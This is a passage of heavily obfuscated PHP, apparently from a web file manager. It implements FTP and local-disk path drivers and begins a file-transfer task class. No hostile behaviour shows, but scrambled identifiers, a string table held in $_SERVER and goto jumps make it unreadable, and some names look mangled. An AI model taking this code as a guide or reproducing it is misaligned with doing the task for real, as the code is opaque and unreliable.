$this->fileList($éˆÑ€…¦óºŸ, $ƒÆĞÁ, $¡İÆßÚ¶, $Ö¶£—”); if ($”›Âî) { return array($Æ¨Ş×¸[203] => count($¡İÆßÚ¶), $Æ¨Ş×¸[204] => count($ƒÆĞÁ)); } if ($–Æõ) { if (count($¡İÆßÚ¶)) { return !0; } } else { if (count($ƒÆĞÁ)) { return !0; } } return !1; } public function listAll($Ÿœı²ÜûßÃ) { $àÀ˜ù†ã¸ =& $_SERVER[èÍ×öˆøÉ]; if (!$this->_isconn()) { return !1; } $ã˜ò»¥ = $Ì°ÃşĞ = array(); $this->fileList($Ÿœı²ÜûßÃ, $ã˜ò»¥, $Ì°ÃşĞ, !0); $ùÚûÊé’ = array(); foreach ($Ì°ÃşĞ as $ë¼) { $ùÚûÊé’[$ë¼[$àÀ˜ù†ã¸[28]]] = $ë¼[$àÀ˜ù†ã¸[78]]; } foreach ($ã˜ò»¥ as $ë¼) { if (is_string($ë¼)) { $ùÚûÊé’[$ë¼] = 0; } } return $this->listAllFiles($Ÿœı²ÜûßÃ, array_keys($ùÚûÊé’), $ùÚûÊé’); } public function getContent($ÛáÔı) { if (!$this->_isconn()) { return !1; } $ÛáÔı = $this->iconvSystem($ÛáÔı); return $this->fileSubstr($ÛáÔı); } public function setContent($ë¼µşú¸ûÏš, $Ã‰êªë¯ÀÂÚ = '') { if (!$this->_isconn()) { return !1; } $øª³”  = $this->pathThis($this->iconvSystem($ë¼µşú¸ûÏš)); $—Ûúôñ¥—Á = $this->tempFile($øª³” ); file_put_contents($—Ûúôñ¥—Á, $Ã‰êªë¯ÀÂÚ); $±Äñ­ç = $this->upload($ë¼µşú¸ûÏš, $this->iconvApp($—Ûúôñ¥—Á)); $this->tempFileRemve($—Ûúôñ¥—Á); return $±Äñ­ç; } public function fileSubstr($™¨¿›öÕ, $’Ò“˜”Ë¶‡ = 0, $ĞÚ²Á¿ï¤ÁĞ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($™¨¿›öÕ, $’Ò“˜”Ë¶‡, $ĞÚ²Á¿ï¤ÁĞ); } private function ftpRequest($í¡ŠÆË, $ÀƒÇ¾Ç¡ğÖ¡ = 0, $Ÿ›õÁÚÊ½Ê¹ = false) { $í¡ŠÆË = $this->iconvSystem($í¡ŠÆË); $İ® = $this->scheme . $this->host . $_SERVER[èÍ×öˆøÉ][4] . $this->port; $ïú§ = curl_init(); curl_setopt($ïú§, CURLOPT_URL, $İ® . $this->pathEncode($í¡ŠÆË)); curl_setopt($ïú§, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($Ÿ›õÁÚÊ½Ê¹) { $–ß²Ø = $ÀƒÇ¾Ç¡ğÖ¡ + $Ÿ›õÁÚÊ½Ê¹ - 1; curl_setopt($ïú§, CURLOPT_RANGE, "{$ÀƒÇ¾Ç¡ğÖ¡}\x2d{$–ß²Ø}"); } curl_setopt($ïú§, CURLOPT_RETURNTRANSFER, 1); $ù‡È = curl_exec($ïú§); curl_close($ïú§); return $ù‡È; } public function upload($ô€ĞÁ, $°šĞ–ğ˜Å, $ñÕø¨ƒÑùˆö = false, $Æš¾ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ô€ĞÁ))) { return !1; } $ô€ĞÁ = $this->iconvSystem($ô€ĞÁ); $°šĞ–ğ˜Å = $this->iconvSystem($°šĞ–ğ˜Å); $º“í°Ë»´î­ = ftp_nb_put($this->connect, $ô€ĞÁ, $°šĞ–ğ˜Å, FTP_BINARY); while ($º“í°Ë»´î­ == FTP_MOREDATA) { $º“í°Ë»´î­ = ftp_nb_continue($this->connect); } if ($º“í°Ë»´î­ != FTP_FINISHED) { return !1; } return $this->getPathOuter($ô€ĞÁ); } public function download($æµ‚ŠÛ, $ç„ = '') { if (!$this->_isconn()) { return !1; } $¥¬âò‹ÍÅ¿İé = $this->pathFather($ç„); if (!IO::mkdir($¥¬âò‹ÍÅ¿İé)) { return !1; } $æµ‚ŠÛ = $this->iconvSystem($æµ‚ŠÛ); $ç„ = $this->iconvSystem($ç„); $Áí = ftp_nb_get($this->connect, $ç„, $æµ‚ŠÛ, FTP_BINARY); while ($Áí == FTP_MOREDATA) { $Áí = ftp_nb_continue($this->connect); } if ($Áí != FTP_FINISHED) { return !1; } return $this->iconvApp($ç„); } public function exist($‡¸º”èÒºË) { return $this->isFile($‡¸º”èÒºË) || $this->isFolder($‡¸º”èÒºË); } public function isFile($¨¦Ô) { return !$this->isFolder($¨¦Ô) && $this->objectMeta($¨¦Ô); } public function isFolder($‹óöæ÷ÓèÚ“) { return $this->cacheMethod($_SERVER[èÍ×öˆøÉ][199], $‹óöæ÷ÓèÚ“); } protected function objectMeta($™…ÀçŒ) { return $this->cacheMethod($_SERVER[èÍ×öˆøÉ][200], $™…ÀçŒ); } protected function _objectMeta($İÏ¾®ğ) { $ò¦ºî =& $_SERVER[èÍ×öˆøÉ]; if ($İÏ¾®ğ == $ò¦ºî[33] || $İÏ¾®ğ == $ò¦ºî[8]) { return array(); } if (!$this->_isconn()) { return !1; } $İÏ¾®ğ = $this->iconvSystem($İÏ¾®ğ); $üş¡Æ¬é·à = array($ò¦ºî[28] => $this->iconvApp($İÏ¾®ğ), $ò¦ºî[29] => $ò¦ºî[193], $ò¦ºî[78] => 0); @ftp_chdir($this->connect, $ò¦ºî[8]); $ù÷æ = @ftp_size($this->connect, $İÏ¾®ğ); if ($ù÷æ != -1) { $üş¡Æ¬é·à[$ò¦ºî[78]] = $ù÷æ; } else { $ÄÜ¤ù® = @ftp_chdir($this->connect, $İÏ¾®ğ); if (!$ÄÜ¤ù®) { return !1; } $üş¡Æ¬é·à[$ò¦ºî[29]] = $ò¦ºî[77]; } return $üş¡Æ¬é·à; } protected function _isFolder($ˆìÆêİ) { $Ø‡ú¿‡ïêÉîÃ =& $_SERVER[èÍ×öˆøÉ]; if ($ˆìÆêİ == $Ø‡ú¿‡ïêÉîÃ[33] || $ˆìÆêİ == $Ø‡ú¿‡ïêÉîÃ[8]) { return !0; } $áóš = $this->_objectMeta($ˆìÆêİ); return isset($áóš[$Ø‡ú¿‡ïêÉîÃ[29]]) && $áóš[$Ø‡ú¿‡ïêÉîÃ[29]] == $Ø‡ú¿‡ïêÉîÃ[77] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($¡³ã¥çñ‘§ï) { if (substr($¡³ã¥çñ‘§ï, 0, 2) == $_SERVER[èÍ×öˆøÉ][1295]) { $¡³ã¥çñ‘§ï = BASIC_PATH . substr($¡³ã¥çñ‘§ï, 2); } return $¡³ã¥çñ‘§ï; } public function iconvApp($şáâÍ¿ò÷ä») { $è”èïƒ =& $_SERVER[èÍ×öˆøÉ]; global $config; return $this->iconvTo($şáâÍ¿ò÷ä», $config[$è”èïƒ[1293]], $config[$è”èïƒ[1292]]); } public function iconvSystem($ó÷ŞœúÒªÜ›) { $®±¨ó¹ =& $_SERVER[èÍ×öˆøÉ]; global $config; return $this->iconvTo($ó÷ŞœúÒªÜ›, $config[$®±¨ó¹[1292]], $config[$®±¨ó¹[1293]]); } public function getPathOuter($ÈÀ°¡ëÜ…) { $Í¸ï»’œÄË› =& $_SERVER[èÍ×öˆøÉ]; $úƒÂÌ· = $this->iconvApp($this->pathBase); $ÈÀ°¡ëÜ… = $this->iconvApp($ÈÀ°¡ëÜ…); if (substr($úƒÂÌ·, 0, 2) == $Í¸ï»’œÄË›[1295]) { $úƒÂÌ· = BASIC_PATH . substr($úƒÂÌ·, 2); } if (substr($ÈÀ°¡ëÜ…, 0, 2) == $Í¸ï»’œÄË›[1295]) { $ÈÀ°¡ëÜ… = BASIC_PATH . substr($ÈÀ°¡ëÜ…, 2); } $úƒÂÌ· = KodIO::clear($úƒÂÌ·); $ÈÀ°¡ëÜ… = KodIO::clear($ÈÀ°¡ëÜ…); $ÈÀ°¡ëÜ… = substr($ÈÀ°¡ëÜ…, strlen($úƒÂÌ·)); if (empty($this->pathDriver)) { return $ÈÀ°¡ëÜ…; } return $this->pathDriver . $Í¸ï»’œÄË›[8] . ltrim($ÈÀ°¡ëÜ…, $Í¸ï»’œÄË›[8]); } public function mkfile($ôÊÆØè, $Õ¯ı = '', $§ÑÔãĞ = REPEAT_RENAME) { $ôÊÆØè = $this->iconvSystem($ôÊÆØè); @touch($ôÊÆØè); if ($Õ¯ı) { file_put_contents($ôÊÆØè, $Õ¯ı); } @chmod($ôÊÆØè, $this->pathAuth); return is_file($ôÊÆØè) ? $this->getPathOuter($ôÊÆØè) : !1; } public function mkdir($€¸²×¶Èê, $ú×»¥æÈğ´ = REPEAT_SKIP) { $€¸²×¶Èê = $this->iconvSystem($€¸²×¶Èê); if (is_dir($€¸²×¶Èê)) { return $this->getPathOuter($€¸²×¶Èê); } @mkdir($€¸²×¶Èê, $this->pathAuth, !0); @chmod($€¸²×¶Èê, $this->pathAuth); return is_dir($€¸²×¶Èê) ? $this->getPathOuter($€¸²×¶Èê) : !1; } public function copyFile($°ÈÌ, $î½†) { $this->mkdir($this->pathFather($î½†)); $°ÈÌ = $this->iconvSystem($°ÈÌ); $î½† = $this->iconvSystem($î½†); $ªò = copy_64($°ÈÌ, $î½†); @chmod($î½†, $this->pathAuth); return $ªò ? $this->getPathOuter($î½†) : !1; } public function moveFile($èÈÈÑ²¥ÒÆŞÔ, $¿Çñ) { $this->mkdir($this->pathFather($¿Çñ)); $èÈÈÑ²¥ÒÆŞÔ = $this->iconvSystem($èÈÈÑ²¥ÒÆŞÔ); $¿Çñ = $this->iconvSystem($¿Çñ); $ííÌëÄ»» = intval(@rename($èÈÈÑ²¥ÒÆŞÔ, $¿Çñ)); if (!$ííÌëÄ»») { if ($ííÌëÄ»» = intval(@copy_64($èÈÈÑ²¥ÒÆŞÔ, $¿Çñ))) { @unlink($èÈÈÑ²¥ÒÆŞÔ); } } @chmod($¿Çñ, $this->pathAuth); return $ííÌëÄ»» ? $this->getPathOuter($¿Çñ) : !1; } public function delFile($Ôˆ´) { $Ôˆ´ = $this->iconvSystem($Ôˆ´); if (!@unlink($Ôˆ´)) { @chmod($Ôˆ´, $this->pathAuth); if (!@unlink($Ôˆ´)) { return !1; } } else { return !0; } } public function delFolder($±‚çÚÆŸ£) { $œ§ß´í®ù¯° =& $_SERVER[èÍ×öˆøÉ]; $±‚çÚÆŸ£ = $this->iconvSystem($±‚çÚÆŸ£); if (!is_dir($±‚çÚÆŸ£)) { return !0; } if (!($±îƒÃ‘ş¢ = opendir($±‚çÚÆŸ£))) { return !1; } while (($š–†ÛÒ¤¯Ö = readdir($±îƒÃ‘ş¢)) !== !1) { if ($š–†ÛÒ¤¯Ö == $œ§ß´í®ù¯°[95] || $š–†ÛÒ¤¯Ö == $œ§ß´í®ù¯°[1302]) { continue; } $Ë¸Í¹ = $±‚çÚÆŸ£ . $œ§ß´í®ù¯°[8] . $š–†ÛÒ¤¯Ö; if (is_file($Ë¸Í¹) || is_link($Ë¸Í¹)) { if (!unlink($Ë¸Í¹)) { chmod($Ë¸Í¹, $this->pathAuth); if (!unlink($Ë¸Í¹)) { return !1; } } } else { if (is_dir($Ë¸Í¹)) { chmod($Ë¸Í¹, $this->pathAuth); $Ë¸Í¹ = $this->iconvApp($Ë¸Í¹); if (!$this->delFolder($Ë¸Í¹)) { return !1; } } } } closedir($±îƒÃ‘ş¢); return rmdir($±‚çÚÆŸ£); } public function rename($¦òàú¦‘Íˆ…, $ìÁ‹Ü¥ãŸÛ) { $ôÏì‚ì†íÎÂ =& $_SERVER[èÍ×öˆøÉ]; $òíŞ = $this->fileNameAuto($this->pathFather($¦òàú¦‘Íˆ…), $ìÁ‹Ü¥ãŸÛ); $òíŞ = $this->iconvSystem($òíŞ); $¦òàú¦‘Íˆ… = $this->iconvSystem($¦òàú¦‘Íˆ…); $ĞĞ‚ = $this->pathFather($¦òàú¦‘Íˆ…); $ÌŸÙüêÓµ = rtrim($ĞĞ‚, $ôÏì‚ì†íÎÂ[8]) . $ôÏì‚ì†íÎÂ[8] . $òíŞ; $î× = @rename($¦òàú¦‘Íˆ…, $ÌŸÙüêÓµ); $ÌŸÙüêÓµ = $this->iconvApp($ÌŸÙüêÓµ); return $î× ? $this->getPathOuter($ÌŸÙüêÓµ) : !1; } public function size($êŸ£) { $êŸ£ = $this->iconvSystem($êŸ£); return filesize_64($êŸ£); } public function info($Îˆ¬ª Àû´) { $Îˆ¬ª Àû´ = $this->iconvSystem($Îˆ¬ª Àû´); if ($this->isFolder($Îˆ¬ª Àû´)) { return $this->folderInfo($Îˆ¬ª Àû´); } else { if ($this->isFile($Îˆ¬ª Àû´)) { return $this->fileInfo($Îˆ¬ª Àû´); } } return !1; } protected function infoChildren($ˆêë×ù°Ê›, &$äĞ—ä•“¸Ÿ, $ª = true) { $“´ûù·Æ =& $_SERVER[èÍ×öˆøÉ]; check_abort_echo(); $ˆêë×ù°Ê› = rtrim($ˆêë×ù°Ê›, $“´ûù·Æ[8]) . $“´ûù·Æ[8]; if ($ª) { $ˆêë×ù°Ê› = $this->iconvSystem($ˆêë×ù°Ê›); } if (!($çÖ³šÇ = @opendir($ˆêë×ù°Ê›))) { return; } while (($ŒŒ°¾êÍğƒ = readdir($çÖ³šÇ)) !== !1) { if ($ŒŒ°¾êÍğƒ == $“´ûù·Æ[95] || $ŒŒ°¾êÍğƒ == $“´ûù·Æ[1302]) { continue; } $äİ­¿­ = $ˆêë×ù°Ê› . $ŒŒ°¾êÍğƒ; if (is_file($äİ­¿­) || is_link($äİ­¿­)) { $äĞ—ä•“¸Ÿ[$“´ûù·Æ[79]]++; $äĞ—ä•“¸Ÿ[$“´ûù·Æ[78]] += filesize_64($äİ­¿­); } else { if (is_dir($äİ­¿­)) { $äĞ—ä•“¸Ÿ[$“´ûù·Æ[80]]++; $this->infoChildren($äİ­¿­, $äĞ—ä•“¸Ÿ, !1); } } } closedir($çÖ³šÇ); } private function folderInfo($Å¯¼›ğ¾, $ ­°¦˜Ÿ²¢ßĞ = false) { $àüË½ĞÌòÌ¯ =& $_SERVER[èÍ×öˆøÉ]; $Å¯¼›ğ¾ = rtrim($Å¯¼›ğ¾, $àüË½ĞÌòÌ¯[8]) . $àüË½ĞÌòÌ¯[8]; $–ıå› = $this->iconvApp($this->pathThis($Å¯¼›ğ¾)); if ($ ­°¦˜Ÿ²¢ßĞ) { return array($àüË½ĞÌòÌ¯[28] => $–ıå›, $àüË½ĞÌòÌ¯[76] => $this->getPathOuter($Å¯¼›ğ¾), $àüË½ĞÌòÌ¯[29] => $àüË½ĞÌòÌ¯[77]); } $úâ¼ÂÃü¸¡ = array($àüË½ĞÌòÌ¯[28] => $–ıå›, $àüË½ĞÌòÌ¯[76] => $this->getPathOuter($Å¯¼›ğ¾), $àüË½ĞÌòÌ¯[29] => $àüË½ĞÌòÌ¯[77], $àüË½ĞÌòÌ¯[194] => @filectime($Å¯¼›ğ¾), $àüË½ĞÌòÌ¯[84] => @filemtime($Å¯¼›ğ¾), $àüË½ĞÌòÌ¯[1305] => @fileatime($Å¯¼›ğ¾), $àüË½ĞÌòÌ¯[1306] => is_readable($Å¯¼›ğ¾), $àüË½ĞÌòÌ¯[1307] => is_writable($Å¯¼›ğ¾), $àüË½ĞÌòÌ¯[1308] => get_mode($Å¯¼›ğ¾)); return $úâ¼ÂÃü¸¡; } private function fileInfo($ÄÔø¶°, $ß…ßÃØ = false) { $õÖùíàºş =& $_SERVER[èÍ×öˆøÉ]; $¢á¤Öµïê§ıÒ = $this->iconvApp($this->pathThis($ÄÔø¶°)); if ($ß…ßÃØ) { return array($õÖùíàºş[28] => $¢á¤Öµïê§ıÒ, $õÖùíàºş[76] => $this->getPathOuter($ÄÔø¶°), $õÖùíàºş[29] => $õÖùíàºş[193], $õÖùíàºş[78] => $this->size($ÄÔø¶°), $õÖùíàºş[168] => $this->ext($¢á¤Öµïê§ıÒ)); } $Î½Êú = array($õÖùíàºş[28] => $¢á¤Öµïê§ıÒ, $õÖùíàºş[76] => $this->getPathOuter($ÄÔø¶°), $õÖùíàºş[29] => $õÖùíàºş[193], $õÖùíàºş[194] => @filectime($ÄÔø¶°), $õÖùíàºş[84] => @filemtime($ÄÔø¶°), $õÖùíàºş[1305] => @fileatime($ÄÔø¶°), $õÖùíàºş[78] => $this->size($ÄÔø¶°), $õÖùíàºş[168] => $this->ext($¢á¤Öµïê§ıÒ), $õÖùíàºş[1306] => is_readable($ÄÔø¶°), $õÖùíàºş[1307] => is_writable($ÄÔø¶°), $õÖùíàºş[1308] => get_mode($ÄÔø¶°)); return $Î½Êú; } public function exist($’Ë®á…‚Ô¿) { $’Ë®á…‚Ô¿ = $this->iconvSystem($’Ë®á…‚Ô¿); return @file_exists($’Ë®á…‚Ô¿); } public function isFile($€ÑÙŒ) { $€ÑÙŒ = $this->iconvSystem($€ÑÙŒ); return @is_file($€ÑÙŒ); } public function isFolder($ƒÒÒ“) { $ƒÒÒ“ = $this->iconvSystem($ƒÒÒ“); return @is_dir($ƒÒÒ“); } public function listPath($›×Ç¶ÉÊ•ÙÜ, $ˆ‘¤³—Çã‡ = false) { $…õ¿‚¤¹« =& $_SERVER[èÍ×öˆøÉ]; $›×Ç¶ÉÊ•ÙÜ = $this->iconvSystem($›×Ç¶ÉÊ•ÙÜ); $›×Ç¶ÉÊ•ÙÜ = rtrim($›×Ç¶ÉÊ•ÙÜ, $…õ¿‚¤¹«[8]) . $…õ¿‚¤¹«[8]; $ÎÂ›ó–ÅğÕ = array($…õ¿‚¤¹«[75] => array(), $…õ¿‚¤¹«[74] => array()); if (!($ÚÓ÷ºÏé³¥Õ = @opendir($›×Ç¶ÉÊ•ÙÜ))) { return $ÎÂ›ó–ÅğÕ; } while (($°æêß = readdir($ÚÓ÷ºÏé³¥Õ)) !== !1) { if ($°æêß == $…õ¿‚¤¹«[95] || $°æêß == $…õ¿‚¤¹«[1302]) { continue; } $šİıœûæ = $›×Ç¶ÉÊ•ÙÜ . $°æêß; if (is_file($šİıœûæ)) { $ÎÂ›ó–ÅğÕ[$…õ¿‚¤¹«[74]][] = $this->fileInfo($šİıœûæ, $ˆ‘¤³—Çã‡); } else { $ÎÂ›ó–ÅğÕ[$…õ¿‚¤¹«[75]][] = $this->folderInfo($šİıœûæ, $ˆ‘¤³—Çã‡); } } closedir($ÚÓ÷ºÏé³¥Õ); return $ÎÂ›ó–ÅğÕ; } public function listAll($ÍŞñ× ¬, &$‘€ŞãÍ®Öóí = array()) { $Ì“âî´×¥ =& $_SERVER[èÍ×öˆøÉ]; $ÍŞñ× ¬ = $this->iconvSystem($ÍŞñ× ¬); $ÍŞñ× ¬ = rtrim($ÍŞñ× ¬, $Ì“âî´×¥[8]) . $Ì“âî´×¥[8]; if (!($ïä = @opendir($ÍŞñ× ¬))) { return $‘€ŞãÍ®Öóí; } while (($²ÑÜ…äõ = readdir($ïä)) !== !1) { if ($²ÑÜ…äõ == $Ì“âî´×¥[95] || $²ÑÜ…äõ == $Ì“âî´×¥[1302]) { continue; } $§©ª¿õÕ = $ÍŞñ× ¬ . $²ÑÜ…äõ; if (is_dir($§©ª¿õÕ) && !is_link($§©ª¿õÕ)) { $‘€ŞãÍ®Öóí[] = array($Ì“âî´×¥[76] => $§©ª¿õÕ . $Ì“âî´×¥[8], $Ì“âî´×¥[77] => 1, $Ì“âî´×¥[84] => @filemtime($§©ª¿õÕ), $Ì“âî´×¥[78] => 0); $this->listAll($§©ª¿õÕ, $‘€ŞãÍ®Öóí); } else { $‘€ŞãÍ®Öóí[] = array($Ì“âî´×¥[76] => $§©ª¿õÕ, $Ì“âî´×¥[77] => 0, $Ì“âî´×¥[84] => @filemtime($§©ª¿õÕ), $Ì“âî´×¥[78] => $this->size($§©ª¿õÕ)); } } closedir($ïä); return $‘€ŞãÍ®Öóí; } public function has($à©¢ø , $å›ğªÌ– = false, $„Îôî›æ‡ = true) { $´¸‚ŠÒ”é =& $_SERVER[èÍ×öˆøÉ]; $à©¢ø  = $this->iconvSystem($à©¢ø ); $à©¢ø  = rtrim($à©¢ø , $´¸‚ŠÒ”é[8]) . $´¸‚ŠÒ”é[8]; if (!($áüÙ = @opendir($à©¢ø ))) { return !1; } $°×­²Œ§»Ú = 0; $ÇÒ’°İ = 0; $²…·Òš…¢ş” = 0; while (($Áïïæ¹ø÷±”¾ = readdir($áüÙ)) !== !1) { if ($Áïïæ¹ø÷±”¾ == $´¸‚ŠÒ”é[95] || $Áïïæ¹ø÷±”¾ == $´¸‚ŠÒ”é[1302]) { continue; } $ï×¦¢ËÜéö× = $à©¢ø  . $Áïïæ¹ø÷±”¾; if ($å›ğªÌ–) { $²…·Òš…¢ş”++; if (@is_file($ï×¦¢ËÜéö×)) { $°×­²Œ§»Ú++; } else { $ÇÒ’°İ++; } if ($²…·Òš…¢ş” > 10000) { break; } continue; } if ($„Îôî›æ‡) { if (@is_file($ï×¦¢ËÜéö×)) { return !0; } } else { if (@is_dir($ï×¦¢ËÜéö× . $´¸‚ŠÒ”é[8])) { return !0; } } } closedir($áüÙ); if ($å›ğªÌ–) { return array($´¸‚ŠÒ”é[203] => $°×­²Œ§»Ú, $´¸‚ŠÒ”é[204] => $ÇÒ’°İ); } return !1; } public function hashSimple($ı©šä‘â–²–) { $¢³îÎ² =& $_SERVER[èÍ×öˆøÉ]; if (!$ı©šä‘â–²–) { return md5($¢³îÎ²[33]); } $ı©šä‘â–²– = $this->iconvSystem($ı©šä‘â–²–); $·­Ï” = $this->size($ı©šä‘â–²–); $ˆ™ß˜¯ÊŸ¡ = 200; $Ü—µòôØÚ… = 50; if ($·­Ï” <= $ˆ™ß˜¯ÊŸ¡ * $Ü—µòôØÚ…) { return $this->hashMd5($ı©šä‘â–²–) . $·­Ï”; } $ûÙ…Úì¾ÃÌ = $¢³îÎ²[33]; $ÔÑù¸û©èÖ = intval($·­Ï” / $Ü—µòôØÚ…); $àÄÍğş = fopen($ı©šä‘â–²–, $¢³îÎ²[1309]); if (!$àÄÍğş) { return $ûÙ…Úì¾ÃÌ; } for ($šİ‘”­’ = 0; $šİ‘”­’ < $Ü—µòôØÚ…; $šİ‘”­’++) { fseek_64($àÄÍğş, $ÔÑù¸û©èÖ * $šİ‘”­’); $ûÙ…Úì¾ÃÌ .= fread($àÄÍğş, $ˆ™ß˜¯ÊŸ¡); } fseek_64($àÄÍğş, $·­Ï” - $ˆ™ß˜¯ÊŸ¡); $ûÙ…Úì¾ÃÌ .= fread($àÄÍğş, $ˆ™ß˜¯ÊŸ¡); fclose($àÄÍğş); return md5($ûÙ…Úì¾ÃÌ) . $·­Ï”; } public function getContent($æ›ø±Ï×«÷†) { $æ›ø±Ï×«÷† = $this->iconvSystem($æ›ø±Ï×«÷†); return file_get_contents($æ›ø±Ï×«÷†); } public function setContent($š°ášÔÍ, $¹ü»ëı€âšŸÆ = '') { $š°ášÔÍ = $this->iconvSystem($š°ášÔÍ); $Ü»“ù‚’”öü = @file_put_contents($š°ášÔÍ, $¹ü»ëı€âšŸÆ, LOCK_EX); clearstatcache(); @chmod($š°ášÔÍ, $this->pathAuth); return $Ü»“ù‚’”öü === !1 ? !1 : !0; } public function fileSubstr($¦ğïæ, $˜°¡å‹«×¨ = 0, $Û¿ = false) { $ï˜»È =& $_SERVER[èÍ×öˆøÉ]; $¦ğïæ = $this->iconvSystem($¦ğïæ); if ($Û¿ === !1) { $Û¿ = $this->size($¦ğïæ); } if ($Û¿ <= 0) { return $ï˜»È[33]; } $Øåìü—şÊ = fopen($¦ğïæ, $ï˜»È[1309]); if (!$Øåìü—şÊ) { return !1; } fseek_64($Øåìü—şÊ, $˜°¡å‹«×¨); $·ó©ßĞ«¨ = fread($Øåìü—şÊ, $Û¿); fclose($Øåìü—şÊ); return $·ó©ßĞ«¨; } public function upload($Í°‰¢ºĞ¸², $ö¼„ˆ…éë”‘, $îÆ = false, $»Ï½†‡üœ = REPEAT_REPLACE) { if ($îÆ) { return $this->moveFile($ö¼„ˆ…éë”‘, $Í°‰¢ºĞ¸²); } return $this->copyFile($ö¼„ˆ…éë”‘, $Í°‰¢ºĞ¸²); } public function setModifyTime($ò—ˆ‘éı, $Æôâîá›º¹Ø = '') { @touch($ò—ˆ‘éı, intval($Æôâîá›º¹Ø)); } public function download($¶ò¡œÆ˜‹ñ, $±Ø) { return $this->iconvSystem($¶ò¡œÆ˜‹ñ); } } goto A¸‡­„Å‘; c¬ «ƒáó×: class TaskFileTransfer extends Task { protected function startAfter() { $æÍ‚„İ·Ã =& $_SERVER[èÍ×öˆøÉ]; $§˜Ã¼é =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($æÍ‚„İ·Ã[1608], array($this, $æÍ‚„İ·Ã[1609])); Hook::bind($æÍ‚„İ·Ã[1148], array($this, $æÍ‚„İ·Ã[1610])); Hook::bind($æÍ‚„İ·Ã[1611], array($this, $æÍ‚„İ·Ã[1612])); Hook::bind($æÍ‚„İ·Ã[592], array($this, $æÍ‚„İ·Ã[1613])); Hook::bind($æÍ‚„İ·Ã[593], array($this, $æÍ‚„İ·Ã[1614])); Hook::bind($æÍ‚„İ·Ã[595], array($this, $æÍ‚„İ·Ã[1615])); Hook::bind($æÍ‚„İ·Ã[596], array($this, $æÍ‚„İ·Ã[1615])); Hook::bind($æÍ‚„İ·Ã[562], array($this, $æÍ‚„İ·Ã[1616])); Hook::bind($æÍ‚„İ·Ã[559], array($this, $æÍ‚„İ·Ã[1616])); Hook::bind($æÍ‚„İ·Ã[564], array($this, $æÍ‚„İ·Ã[1616])); Hook::bind($æÍ‚„İ·Ã[566], array($this, $æÍ‚„İ·Ã[1616])); Hook::bind($æÍ‚„İ·Ã[568], array($this, $æÍ‚„İ·Ã[1616])); Hook::bind($æÍ‚„İ·Ã[1617], array($this, $æÍ‚„İ·Ã[1618])); Hook::bind($æÍ‚„İ·Ã[585], array($this, $æÍ‚„İ·Ã[1619])); $this->sourceModelCopyFlag = !1; Hook::bind($æÍ‚„İ·Ã[1620], array($this, $æÍ‚„İ·Ã[1621])); Hook::bind($æÍ‚„İ·Ã[1622], array($this, $æÍ‚„İ·Ã[1623])); Hook::bind($æÍ‚„İ·Ã[1624], array($this, $æÍ‚„İ·Ã[1625])); $§˜Ã¼é[$æÍ‚„İ·Ã[1626]] = LNG($æÍ‚„İ·Ã[1627]); $§˜Ã¼é[$æÍ‚„İ·Ã[1628]] = 0; $§˜Ã¼é[$æÍ‚„İ·Ã[1629]] = 0; $§˜Ã¼é[$æÍ‚„İ·Ã[1062]] = $æÍ‚„İ·Ã[33]; $§˜Ã¼é[$æÍ‚„İ·Ã[1630]] = $æÍ‚„İ·Ã[33]; $§˜Ã¼é[$æÍ‚„İ·Ã[1631]] = 0; $§˜Ã¼é[$æÍ‚„İ·Ã[1632]] = 0; $§˜Ã¼é[$æÍ‚„İ·Ã[1633]] = 0; if (!$§˜Ã¼é[$æÍ‚„İ·Ã[1485]]) { $§˜Ã¼é[$æÍ‚„İ·Ã[1485]] = LNG($æÍ‚„İ·Ã[1634]); } } protected function endAfter() { $ÚÓÅíÆÀ¡«² =& $_SERVER[èÍ×öˆøÉ]; Hook::unbind($ÚÓÅíÆÀ¡«²[1608], array($this, $ÚÓÅíÆÀ¡«²[1609])); Hook::unbind($ÚÓÅíÆÀ¡«²[1148], array($this, $ÚÓÅíÆÀ¡«²[1610])); Hook::unbind($ÚÓÅíÆÀ¡«²[1611], array($this, $ÚÓÅíÆÀ¡«²[1612])); Hook::unbind($ÚÓÅíÆÀ¡«²[592], array($this, $ÚÓÅíÆÀ¡«²[1613])); Hook::unbind($ÚÓÅíÆÀ¡«²[593], array($this, $ÚÓÅíÆÀ¡«²[1614])); Hook::unbind($ÚÓÅíÆÀ¡«²[595], array($this, $ÚÓÅíÆÀ¡«²[1615])); Hook::unbind($ÚÓÅíÆÀ¡«²[596], array($this, $ÚÓÅíÆÀ¡«²[1615])); Hook::unbind($ÚÓÅíÆÀ¡«²[562], array($this, $ÚÓÅíÆÀ¡«²[1616])); Hook::unbind($ÚÓÅíÆÀ¡«²[559], array($this, $ÚÓÅíÆÀ¡«²[1616])); Hook::unbind($ÚÓÅíÆÀ¡«²[564], array($this, $ÚÓÅíÆÀ¡«²[1616])); Hook::unbind($ÚÓÅíÆÀ¡«²[566], array($this, $ÚÓÅíÆÀ¡«²[1616])); Hook::unbind($ÚÓÅíÆÀ¡«²[568], array($this, $ÚÓÅíÆÀ¡«²[1616])); Hook::unbind($ÚÓÅíÆÀ¡«²[1617], array($this, $ÚÓÅíÆÀ¡«²[1618])); Hook::unbind($ÚÓÅíÆÀ¡«²[585], array($this, $ÚÓÅíÆÀ¡«²[1619])); Hook::unbind($ÚÓÅíÆÀ¡«²[1620], array($this, $ÚÓÅíÆÀ¡«²[1621])); Hook::unbind($ÚÓÅíÆÀ¡«²[1622], array($this, $ÚÓÅíÆÀ¡«²[1623])); Hook::unbind($ÚÓÅíÆÀ¡«²[1624], array($this, $ÚÓÅíÆÀ¡«²[1625])); } public function copyMoveStart($¯ùı¬, $²ß†¶±ï…í, $‡Ö×Ø³, $ÑÜíİ) { $àîòĞÙ‰• =& $_SERVER[èÍ×öˆøÉ]; self::log($àîòĞÙ‰•[1635] . $²ß†¶±ï…í . $àîòĞÙ‰•[67] . $ÑÜíİ); $ÃˆÓ¼µğæ = rtrim(TEMP_FILES, $àîòĞÙ‰•[8]); if (substr($²ß†¶±ï…í, 0, strlen($ÃˆÓ¼µğæ)) == $ÃˆÓ¼µğæ) { return; } if (substr($ÑÜíİ, 0, strlen($ÃˆÓ¼µğæ)) == $ÃˆÓ¼µğæ) { return; } 